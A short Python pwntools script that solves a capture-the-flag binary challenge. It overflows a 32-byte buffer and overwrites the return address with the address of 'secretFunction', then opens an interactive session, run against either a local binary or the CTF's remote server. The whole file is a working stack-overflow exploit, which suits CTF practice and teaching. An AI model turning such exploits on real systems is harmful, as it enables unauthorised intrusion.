from pwn import *
from struct import *

def exploit(r):

    payload = ''
    payload += 'A'*32
    payload += p64(binary.symbols['secretFunction'])
    r.recvuntil(':\n')
    r.send(payload)
    r.interactive()

if __name__ == '__main__':
    name = './challenge'
    binary = ELF(name)
    context.log_level = 'DEBUG'

    if len(sys.argv) > 1:
        r = remote('university.opentoallctf.com', '30000')
    else:
        r = process(name)
        pause()

    exploit(r)

